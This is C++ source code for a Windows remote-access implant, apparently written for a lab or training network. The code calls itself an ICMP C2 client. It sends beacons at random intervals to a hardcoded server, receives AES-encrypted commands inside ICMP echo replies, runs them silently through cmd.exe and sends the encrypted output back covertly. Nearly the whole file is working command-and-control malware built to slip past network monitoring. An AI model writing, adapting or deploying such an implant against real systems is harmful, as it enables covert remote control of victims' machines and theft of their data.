#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <algorithm>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

// ── Configuration ─────────────────────────────────────────────────────────────
static constexpr const char* SERVER_IP    = "10.10.14.74";
static constexpr DWORD       BEACON_MIN_MS = 3000;
static constexpr DWORD       BEACON_MAX_MS = 20000;
static constexpr DWORD       RECV_WINDOW  = 2000;
static constexpr DWORD       RECV_POLL    = 200;
static constexpr size_t      MAX_OUT      = 0xFFFF;

// ── AES-256 Key — must match server.py ────────────────────────
static constexpr uint8_t AES_KEY[32] = {
    0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe,
    0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81,
    0x1f, 0x35, 0x2c, 0x07, 0x3b, 0x61, 0x08, 0xd7,
    0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14, 0xdf, 0xf4
};

// ── Protocol ──────────────────────────────────────────────────────────────────
static constexpr uint8_t MAGIC[4] = { 0xDE, 0xAD, 0xBE, 0xEF };
enum MsgType : uint8_t {
    MSG_BEACON = 0x01,
    MSG_CMD    = 0x02,
    MSG_OUTPUT = 0x03,
    MSG_ACK    = 0x04
};

static const char* msgtype_str(uint8_t t) {
    switch (t) {
    case 0x01: return "BEACON";
    case 0x02: return "CMD";
    case 0x03: return "OUTPUT";
    case 0x04: return "ACK";
    default:   return "UNKNOWN";
    }
}

#pragma pack(push, 1)
struct ICMPHdr { uint8_t type, code; uint16_t cksum, id, seq; };
#pragma pack(pop)

static std::string hexdump(const uint8_t* buf, size_t len, size_t max_bytes = 32) {
    std::ostringstream ss;
    size_t show = std::min(len, max_bytes);
    for (size_t i = 0; i < show; i++)
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)buf[i] << ' ';
    if (len > max_bytes) ss << "...";
    return ss.str();
}

// ── AES-256-CBC via BCrypt ────────────────────────────────────────────────────

// Returns IV (16B) + ciphertext
static std::vector<uint8_t> aes_encrypt(const uint8_t* data, size_t len) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    DWORD keyObjSize = 0, dummy = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&keyObjSize, sizeof(keyObjSize), &dummy, 0);
    std::vector<uint8_t> keyObj(keyObjSize);
    BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjSize,
        (PUCHAR)AES_KEY, 32, 0);

    // Random IV
    uint8_t iv[16], iv_copy[16];
    BCryptGenRandom(nullptr, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    memcpy(iv_copy, iv, 16);

    // Get output size
    DWORD ct_size = 0;
    BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr,
        iv_copy, 16, nullptr, 0, &ct_size, BCRYPT_BLOCK_PADDING);

    std::vector<uint8_t> out(16 + ct_size);
    memcpy(out.data(), iv, 16); // prepend IV
    memcpy(iv_copy, iv, 16);   // BCrypt modifies IV in place, restore it

    DWORD actual = 0;
    BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr,
        iv_copy, 16, out.data() + 16, ct_size, &actual, BCRYPT_BLOCK_PADDING);

    out.resize(16 + actual);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

// Expects IV (16B) + ciphertext, returns plaintext
static std::vector<uint8_t> aes_decrypt(const uint8_t* data, size_t len) {
    if (len < 17) return {};

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    DWORD keyObjSize = 0, dummy = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&keyObjSize, sizeof(keyObjSize), &dummy, 0);
    std::vector<uint8_t> keyObj(keyObjSize);
    BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjSize,
        (PUCHAR)AES_KEY, 32, 0);

    uint8_t iv[16];
    memcpy(iv, data, 16);
    const uint8_t* ct  = data + 16;
    ULONG          ct_len = (ULONG)(len - 16);

    std::vector<uint8_t> out(ct_len);
    DWORD actual = 0;
    NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, nullptr,
        iv, 16, out.data(), ct_len, &actual, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) {
        std::cout << "[ERR] AES decrypt failed" << std::endl;
        return {};
    }

    out.resize(actual);
    return out;
}

// ── Checksum ──────────────────────────────────────────────────────────────────
static uint16_t inet_cksum(const void* buf, size_t len) {
    const auto* p = static_cast<const uint16_t*>(buf);
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *reinterpret_cast<const uint8_t*>(p);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

// ── Protocol helpers ──────────────────────────────────────────────────────────
static std::vector<uint8_t> build_payload(uint32_t sid, MsgType t,
    const uint8_t* d = nullptr, uint16_t dlen = 0)
{
    std::vector<uint8_t> p;
    p.insert(p.end(), MAGIC, MAGIC + 4);
    for (int i = 3; i >= 0; i--) p.push_back((sid >> (8 * i)) & 0xFF);
    p.push_back(static_cast<uint8_t>(t));
    p.push_back((dlen >> 8) & 0xFF);
    p.push_back(dlen & 0xFF);
    if (d && dlen) p.insert(p.end(), d, d + dlen);
    return p;
}

static std::vector<uint8_t> build_icmp(uint16_t id, uint16_t seq,
    const std::vector<uint8_t>& payload)
{
    std::vector<uint8_t> pkt(sizeof(ICMPHdr) + payload.size(), 0);
    auto* h = reinterpret_cast<ICMPHdr*>(pkt.data());
    h->type = 8; h->code = 0;
    h->id   = htons(id);
    h->seq  = htons(seq);
    std::memcpy(pkt.data() + sizeof(ICMPHdr), payload.data(), payload.size());
    h->cksum = inet_cksum(pkt.data(), pkt.size());
    return pkt;
}

struct Parsed { bool ok = false; uint32_t sid = 0; MsgType type{}; std::vector<uint8_t> data; };

static Parsed parse_payload(const uint8_t* buf, size_t len) {
    Parsed r;
    if (len < 11 || std::memcmp(buf, MAGIC, 4) != 0) return r;
    r.sid = ((uint32_t)buf[4] << 24) | ((uint32_t)buf[5] << 16) |
            ((uint32_t)buf[6] << 8)  |  (uint32_t)buf[7];
    r.type = static_cast<MsgType>(buf[8]);
    uint16_t dlen = ((uint16_t)buf[9] << 8) | buf[10];
    if (len < 11u + dlen) return r;
    r.data.assign(buf + 11, buf + 11 + dlen);
    r.ok = true;
    return r;
}

// ── select()-based recv with timeout ─────────────────────────────────────────
static int recv_with_timeout(SOCKET sock, uint8_t* buf, int buflen,
    sockaddr_in* from, int* fromlen, DWORD timeout_ms)
{
    fd_set fds; FD_ZERO(&fds); FD_SET(sock, &fds);
    timeval tv{};
    tv.tv_sec  = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    int sel = select(0, &fds, nullptr, nullptr, &tv);
    if (sel == 0) return -1;
    if (sel < 0)  return -2;
    return recvfrom(sock, reinterpret_cast<char*>(buf), buflen, 0,
        reinterpret_cast<sockaddr*>(from), fromlen);
}

// ── Command execution ─────────────────────────────────────────────────────────
static std::string exec_cmd(const std::string& cmd) {
    std::cout << "[DBG] exec_cmd: " << cmd << std::endl;

    HANDLE hR, hW;
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    if (!CreatePipe(&hR, &hW, &sa, 0)) return "[pipe failed]\n";

    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /c " + cmd;
    std::vector<char> mbuf(full.begin(), full.end());
    mbuf.push_back('\0');

    if (!CreateProcessA(nullptr, mbuf.data(), nullptr, nullptr, TRUE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        DWORD err = GetLastError();
        CloseHandle(hR); CloseHandle(hW);
        return "[CreateProcess failed: " + std::to_string(err) + "]\n";
    }
    CloseHandle(hW);
    WaitForSingleObject(pi.hProcess, 15000);

    std::string out;
    char tmp[4096]; DWORD rd;
    while (ReadFile(hR, tmp, sizeof(tmp) - 1, &rd, nullptr) && rd)
        out.append(tmp, rd);

    CloseHandle(hR);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "[DBG] exec_cmd output: " << out.size() << "B" << std::endl;
    return out.empty() ? "[no output]\n" : out;
}

// ── Main ──────────────────────────────────────────────────────────────────────
int main() {
    std::cout << std::unitbuf;
    srand(GetTickCount() ^ GetCurrentProcessId());

    std::cout << "[DBG] Starting ICMP C2 client (AES-256-CBC)" << std::endl;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, nullptr, 0, 0);
    if (sock == INVALID_SOCKET) {
        std::cout << "[ERR] WSASocket FAILED -- run as Administrator" << std::endl;
        WSACleanup(); return 1;
    }

    sockaddr_in srv{};
    srv.sin_family = AF_INET;
    InetPtonA(AF_INET, SERVER_IP, &srv.sin_addr);
    std::cout << "[DBG] Server: " << SERVER_IP << std::endl;

    uint32_t sid     = GetTickCount() ^ GetCurrentProcessId();
    uint16_t seq     = 0;
    uint16_t icmp_id = static_cast<uint16_t>(GetCurrentProcessId() & 0xFFFF);
    std::vector<uint8_t> rbuf(65535);

    std::cout << "[DBG] SID=" << std::hex << sid
              << "  ICMP_ID=" << icmp_id << std::dec << std::endl;

    int cycle = 0;
    for (;;) {
        DWORD cycle_start = GetTickCount();
        std::cout << "\n[DBG] --- Beacon cycle #" << ++cycle << " ---" << std::endl;

        // ── Send BEACON ───────────────────────────────────────────────────────
        uint16_t sent_seq = seq++;
        auto payload = build_payload(sid, MSG_BEACON);
        auto pkt     = build_icmp(icmp_id, sent_seq, payload);

        int sent = sendto(sock,
            reinterpret_cast<const char*>(pkt.data()),
            static_cast<int>(pkt.size()), 0,
            reinterpret_cast<const sockaddr*>(&srv), sizeof(srv));

        if (sent == SOCKET_ERROR)
            std::cout << "[ERR] sendto FAILED" << std::endl;
        else
            std::cout << "[DBG] BEACON sent seq=" << sent_seq
                      << "  " << hexdump(pkt.data(), pkt.size()) << std::endl;

        // ── Receive loop ──────────────────────────────────────────────────────
        int  recv_attempts = 0;
        bool got_reply     = false;

        while ((GetTickCount() - cycle_start) < RECV_WINDOW) {
            sockaddr_in from{}; int flen = sizeof(from);
            int n = recv_with_timeout(sock, rbuf.data(),
                static_cast<int>(rbuf.size()), &from, &flen, RECV_POLL);
            recv_attempts++;

            if (n == -1) continue; // select timeout
            if (n <  0)  continue; // error

            if (from.sin_addr.s_addr != srv.sin_addr.s_addr) continue;

            int ip_hdr = (rbuf[0] & 0x0F) * 4;
            if (n <= ip_hdr + static_cast<int>(sizeof(ICMPHdr))) continue;

            const uint8_t* icmp_raw = rbuf.data() + ip_hdr;
            uint8_t  icmp_type = icmp_raw[0];
            uint16_t recv_seq  = ntohs(*reinterpret_cast<const uint16_t*>(icmp_raw + 6));

            if (icmp_type != 0)       continue; // not echo reply
            if (recv_seq != sent_seq) continue; // stale

            const uint8_t* icmp_pay = icmp_raw + sizeof(ICMPHdr);
            size_t pay_len = static_cast<size_t>(n) - ip_hdr - sizeof(ICMPHdr);

            if (pay_len < 4 || std::memcmp(icmp_pay, MAGIC, 4) != 0) continue;

            Parsed p = parse_payload(icmp_pay, pay_len);
            if (!p.ok)        continue;
            if (p.sid != sid) continue;
            if (p.type == MSG_BEACON) continue; // kernel echo-back

            std::cout << "[DBG] Reply: " << msgtype_str(p.type) << std::endl;

            if (p.type == MSG_CMD) {
                // Decrypt command
                auto dec = aes_decrypt(p.data.data(), p.data.size());
                if (dec.empty()) {
                    std::cout << "[ERR] CMD decrypt failed, skipping" << std::endl;
                    got_reply = true;
                    break;
                }
                std::string cmd(dec.begin(), dec.end());
                std::cout << "[DBG] CMD: \"" << cmd << "\"" << std::endl;

                std::string out    = exec_cmd(cmd);
                size_t out_len     = std::min(out.size(), MAX_OUT);

                // Encrypt output before sending
                auto enc = aes_encrypt(
                    reinterpret_cast<const uint8_t*>(out.data()), out_len);
                auto out_pay = build_payload(sid, MSG_OUTPUT,
                    enc.data(), static_cast<uint16_t>(enc.size()));
                uint16_t out_seq = seq++;
                auto out_pkt = build_icmp(icmp_id, out_seq, out_pay);

                int s2 = sendto(sock,
                    reinterpret_cast<const char*>(out_pkt.data()),
                    static_cast<int>(out_pkt.size()), 0,
                    reinterpret_cast<const sockaddr*>(&srv), sizeof(srv));
                std::cout << "[DBG] OUTPUT sent: " << s2 << "B (encrypted)" << std::endl;
            }

            got_reply = true;
            break;
        }

        std::cout << "[DBG] Loop done: attempts=" << recv_attempts
                  << "  got_reply=" << (got_reply ? "YES" : "NO") << std::endl;

        // ── Jitter sleep ──────────────────────────────────────────────────────
        DWORD elapsed   = GetTickCount() - cycle_start;
        DWORD jitter    = BEACON_MIN_MS + (rand() % (BEACON_MAX_MS - BEACON_MIN_MS + 1));
        DWORD remaining = (elapsed < jitter) ? (jitter - elapsed) : 0;
        std::cout << "[DBG] Sleeping " << remaining << "ms (jitter=" << jitter << "ms)" << std::endl;
        if (remaining) Sleep(remaining);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
